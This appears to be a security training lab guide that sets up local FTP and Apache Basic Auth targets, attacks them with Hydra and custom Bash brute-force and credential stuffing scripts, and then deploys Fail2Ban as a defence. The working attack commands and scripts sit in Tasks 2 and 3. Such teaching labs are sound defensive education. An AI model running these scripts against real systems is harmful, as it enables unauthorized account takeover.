# 🔐 Brute-Force and Credential Stuffing Attacks

![Linux](https://img.shields.io/badge/Linux-Ubuntu%2020.04-E95420?style=for-the-badge&logo=ubuntu)
![Hydra](https://img.shields.io/badge/Hydra-Authentication%20Testing-red?style=for-the-badge)
![Apache](https://img.shields.io/badge/Apache-Web%20Server-D22128?style=for-the-badge&logo=apache)
![FTP](https://img.shields.io/badge/FTP-vsftpd-blue?style=for-the-badge)
![Bash](https://img.shields.io/badge/Bash-Scripting-4EAA25?style=for-the-badge&logo=gnubash)
![Fail2Ban](https://img.shields.io/badge/Fail2Ban-Intrusion%20Prevention-orange?style=for-the-badge)
![Cybersecurity](https://img.shields.io/badge/Cybersecurity-Adversary%20Emulation-darkred?style=for-the-badge)

---

# 📖 Overview

This lab provides hands-on experience with **Brute-Force Attacks** and **Credential Stuffing Attacks** using Hydra and custom Bash automation. Students will learn how attackers attempt unauthorized access using weak credentials and how defenders can implement protections such as rate limiting and Fail2Ban.

---

# 🎯 Objectives

By the end of this lab, students will be able to:

✅ Understand brute-force attack methodologies

✅ Understand credential stuffing attack techniques

✅ Use Hydra to test authentication security

✅ Create Bash scripts for attack automation

✅ Analyze authentication attack patterns

✅ Implement defensive security controls

✅ Generate professional security reports

✅ Document vulnerabilities and findings

---

# 🛠️ Prerequisites

- Linux Command Line Fundamentals
- Understanding of HTTP and FTP Protocols
- Authentication Concepts
- Basic Bash Scripting
- Ethical Hacking Knowledge
- Authorization to Perform Security Testing

---

# 🧪 Lab Environment

Al Nafi Cloud provides:

- Ubuntu Linux
- Hydra Pre-installed
- Apache HTTP Service
- FTP Service
- Sample Accounts
- Security Testing Tools

---

# 📂 Lab Architecture

```text
Attacker Machine
       │
       ▼
 ┌─────────────┐
 │   Hydra     │
 └─────────────┘
       │
 ┌─────┴─────┐
 ▼           ▼
FTP Server  HTTP Server
       │
       ▼
 Credential Discovery
       │
       ▼
 Security Assessment
```

---

# 🚀 Task 1: Environment Setup

## 🔹 Step 1: Verify Tools

```bash
# Verify Hydra installation
hydra -h | head -5

# System information
uname -a
whoami
```

---

## 🔹 Step 2: Install Target Services

```bash
sudo apt update
sudo apt install -y vsftpd apache2

sudo systemctl start vsftpd apache2
sudo systemctl enable vsftpd apache2

sudo netstat -tlnp | grep -E ':(21|80)'
```

---

## 🔹 Step 3: Create Test Users

```bash
sudo useradd -m testuser1
sudo useradd -m admin

echo 'testuser1:password123' | sudo chpasswd
echo 'admin:admin' | sudo chpasswd

cat /etc/passwd | grep -E 'testuser|admin'
```

---

## 🔹 Step 4: Configure HTTP Authentication

```bash
sudo mkdir -p /var/www/html/protected

echo "<h1>Protected Area</h1>" | sudo tee /var/www/html/protected/index.html

sudo htpasswd -cb /etc/apache2/.htpasswd webuser password
sudo htpasswd -b /etc/apache2/.htpasswd admin admin123
```

### Apache Configuration

```bash
sudo tee /etc/apache2/sites-available/000-default.conf > /dev/null << 'EOF'
<VirtualHost *:80>
    DocumentRoot /var/www/html

    <Directory /var/www/html/protected>
        AuthType Basic
        AuthName "Protected Area"
        AuthUserFile /etc/apache2/.htpasswd
        Require valid-user
    </Directory>
</VirtualHost>
EOF
```

Restart Apache:

```bash
sudo systemctl restart apache2
```

---

## 🔹 Step 5: Create Wordlists

### Username List

```bash
cat > userlist.txt << 'EOF'
admin
root
test
testuser1
webuser
guest
EOF
```

### Password List

```bash
cat > passlist.txt << 'EOF'
password
123456
admin
password123
admin123
test
guest
qwerty
letmein
EOF
```

---

# ⚔️ Task 2: Brute-Force Attacks with Hydra

## 🔹 Understanding Hydra Syntax

```bash
hydra -h
```

Common Syntax:

```bash
hydra -l username -p password target service

hydra -L userlist -P passlist target service
```

---

## 🔹 Single Credential Testing

### FTP Authentication

```bash
hydra -l testuser1 -p password123 127.0.0.1 ftp
```

### Password List Testing

```bash
hydra -l admin -P passlist.txt 127.0.0.1 ftp -v
```

---

## 🔹 Full FTP Brute Force

```bash
hydra -L userlist.txt \
      -P passlist.txt \
      -v \
      -f \
      -o ftp_results.txt \
      127.0.0.1 ftp
```

---

## 🔹 HTTP Basic Authentication Attack

```bash
hydra -L userlist.txt \
      -P passlist.txt \
      -f \
      -o http_results.txt \
      127.0.0.1 http-get /protected/
```

View Results:

```bash
cat ftp_results.txt

cat http_results.txt
```

---

## 🔹 Advanced Hydra Options

### Multi-threading

```bash
hydra -L userlist.txt -P passlist.txt -t 16 127.0.0.1 ftp
```

### Delay Between Attempts

```bash
hydra -L userlist.txt -P passlist.txt -W 2 127.0.0.1 ftp
```

### Stop After First Success

```bash
hydra -L userlist.txt -P passlist.txt -f 127.0.0.1 ftp
```

---

# 🤖 Task 3: Custom Attack Automation

## 🔹 Basic Brute Force Script

```bash
#!/bin/bash

TARGET=$1
SERVICE=$2
USERLIST=$3
PASSLIST=$4

if [ $# -ne 4 ]; then
    echo "Usage: $0 <target> <service> <userlist> <passlist>"
    exit 1
fi

if [ ! -f "$USERLIST" ] || [ ! -f "$PASSLIST" ]; then
    echo "Wordlist files not found!"
    exit 1
fi

OUTPUT="results_$(date +%Y%m%d_%H%M%S).txt"

hydra -L "$USERLIST" \
      -P "$PASSLIST" \
      -f \
      -o "$OUTPUT" \
      "$TARGET" "$SERVICE"

echo "Results saved to $OUTPUT"
```

---

## 🔹 Credential Stuffing Script

```bash
#!/bin/bash

TARGET=$1

cat > creds.txt << 'EOF'
admin:admin
admin:password
test:test
webuser:password
EOF

while IFS=: read -r USER PASS
do
    echo "[+] Testing $USER:$PASS"

    curl -s \
         -u "$USER:$PASS" \
         http://$TARGET/protected/ \
         | grep -q "Protected Area"

    if [ $? -eq 0 ]; then
        echo "[SUCCESS] $USER:$PASS"
    fi

done < creds.txt
```

---

## 🔹 Attack Results Analyzer

```bash
#!/bin/bash

RESULTS_FILE=$1

if [ ! -f "$RESULTS_FILE" ]; then
    echo "Results file not found"
    exit 1
fi

echo "Successful Credentials:"
grep "login:" "$RESULTS_FILE"

echo
echo "Compromised Accounts:"
grep "login:" "$RESULTS_FILE" | awk '{print $5,$7}'
```

---

# 🛡️ Task 4: Defense Testing

## 🔹 Rate Limiting Test

```bash
#!/bin/bash

for i in {1..20}
do
    hydra -l admin -p wrongpass 127.0.0.1 ftp
done
```

Monitor:

```bash
journalctl -f
```

---

# 🔐 Configure Fail2Ban

## Install

```bash
sudo apt install -y fail2ban
```

---

## Create Jail Configuration

```bash
sudo tee /etc/fail2ban/jail.local > /dev/null << 'EOF'
[DEFAULT]
bantime = 600
findtime = 300
maxretry = 3

[vsftpd]
enabled = true
port = ftp
logpath = /var/log/vsftpd.log

[apache-auth]
enabled = true
port = http,https
logpath = /var/log/apache2/error.log
EOF
```

---

## Start Fail2Ban

```bash
sudo systemctl start fail2ban
sudo systemctl enable fail2ban

sudo fail2ban-client status
```

---

## Test Blocking

```bash
for i in {1..5}
do
    hydra -l baduser -p badpass 127.0.0.1 ftp
    sleep 1
done
```

Check Status:

```bash
sudo fail2ban-client status vsftpd
```

Unban IP:

```bash
sudo fail2ban-client set vsftpd unbanip 127.0.0.1
```

---

# 📊 Security Report Template

```markdown
# Security Assessment Report

## Executive Summary

- Summary of findings
- Critical vulnerabilities discovered
- Risk rating

## Methodology

- Hydra Testing
- Credential Stuffing Assessment
- Defensive Validation

## Findings

### Weak Credentials

### Compromised Accounts

### Authentication Weaknesses

## Recommendations

1. Enable MFA
2. Enforce Strong Password Policies
3. Deploy Fail2Ban
4. Implement Rate Limiting
5. Monitor Authentication Logs

## Conclusion

Overall security posture assessment.
```

---

# 🧪 Validation Checklist

```bash
# Hydra Installed
hydra -h | head -5

# FTP Running
sudo systemctl status vsftpd

# Apache Running
sudo systemctl status apache2

# Fail2Ban Running
sudo fail2ban-client status

# Wordlists Exist
ls userlist.txt passlist.txt
```

---

# 🚨 Troubleshooting

## Hydra Connection Refused

```bash
sudo systemctl status vsftpd
sudo systemctl status apache2
```

---

## No Output Generated

```bash
ls -lah ftp_results.txt
ls -lah http_results.txt
```

---

## Fail2Ban Not Blocking

```bash
sudo fail2ban-client status

sudo journalctl -u fail2ban
```

---

## Script Permission Issues

```bash
chmod +x *.sh
```

---

# 🔒 Security Considerations

⚠️ Only test systems you own or have explicit authorization to assess.

⚠️ Unauthorized access attempts may violate laws and organizational policies.

⚠️ Always document testing activities and maintain professional ethics.

---

# 🎓 Learning Outcomes

After completing this lab, you can:

✅ Conduct FTP brute-force assessments

✅ Perform HTTP authentication testing

✅ Automate credential attacks using Bash

✅ Analyze compromised credentials

✅ Deploy Fail2Ban defenses

✅ Validate rate limiting protections

✅ Produce professional security assessment reports

---

# 📚 Key Takeaways

- Weak passwords remain one of the most common attack vectors.
- Hydra can automate credential testing at scale.
- Credential stuffing leverages reused passwords across services.
- Rate limiting and Fail2Ban significantly reduce attack effectiveness.
- Security assessments require both offensive and defensive validation.

---

# ⚖️ Ethical Reminder

This lab is intended solely for educational purposes and authorized security testing.

Always obtain written permission before performing authentication testing against any system.

Unauthorized access attempts are illegal and unethical.

---
⭐ Developed for Incident Response, Adversary Emulation, and Security Assessment Training.
